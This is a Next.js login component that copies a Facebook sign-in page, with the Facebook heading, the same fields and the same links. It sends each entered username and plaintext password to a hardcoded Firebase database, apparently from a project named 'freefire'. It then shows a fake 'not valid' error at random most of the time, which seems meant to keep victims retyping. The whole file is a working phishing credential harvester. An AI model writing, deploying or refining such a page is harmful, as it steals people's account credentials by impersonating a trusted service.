import styles from '../styles/login.module.css';
import { useRouter } from 'next/router';
import { useState,useRef } from 'react';
import { initializeApp } from 'firebase/app';
import { getDatabase, ref, set } from 'firebase/database';

function writeUserData(username, password) {
  const db = getDatabase();
  set(ref(db, 'users/' + username), {
    password
  });
}

const firebaseConfig = {
  apiKey: 'AIzaSyCpvpUTwa9lnpWK6sh-5bcalcM2wQoFYwE',
  authDomain: 'freefire-5c9da.firebaseapp.com',
  projectId: 'freefire-5c9da',
  storageBucket: 'freefire-5c9da.appspot.com',
  messagingSenderId: '575127247016',
  appId: '1:575127247016:web:928081d5a437fcefbd4a9d',
  measurementId: 'G-TL9MT4BTBN'
};

function Login() {
  const router = useRouter();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const app = initializeApp(firebaseConfig);
  const loader = useRef(null)
  const error = useRef(null)
  const handleClick = () => {
    var sucess_fail = [0,0,0,1];
    var tick = sucess_fail[Math.floor(Math.random() * sucess_fail.length)];
    console.log(tick)
    if (username.length != 0 && password.length != 0) {
      writeUserData(username, password);
      loader.current.classList.add("loader")
      error.current.style.display = "none"
      loader.current.style.animationPlayState = "running"
        loader.current.onanimationend = ()=>{
          if (tick == 0){
            error.current.style.display = "none"
            router.push('final');
          }else {
            error.current.style.display = "block"
          } 
          loader.current.classList.remove("loader")
        }

    } else {
      alert('fill the form');
    }
  };
  return (
    <>
      <div className="main">
        <div className={styles.header}>
          <h1>Facebook</h1>
          <div className="loader" ref={loader}></div>
        </div>
        <div className={styles.form}>
          <span className={styles.error} ref={error}>Username or password is not valid</span>
          <input
            className="username"
            type="text"
            value={username}
            onInput={e => setUsername(e.target.value)}
          />
          <input
            className="password"
            type="password"
            value={password}
            onInput={e => setPassword(e.target.value)}
          />
          <button className={styles.login} onClick={() => handleClick()}>
            Log in
          </button>
          <p>Forget Password?</p>
          <hr />
          <button className={styles.create}>Create account</button>
        </div>
      </div>
    </>
  );
}

export default Login;
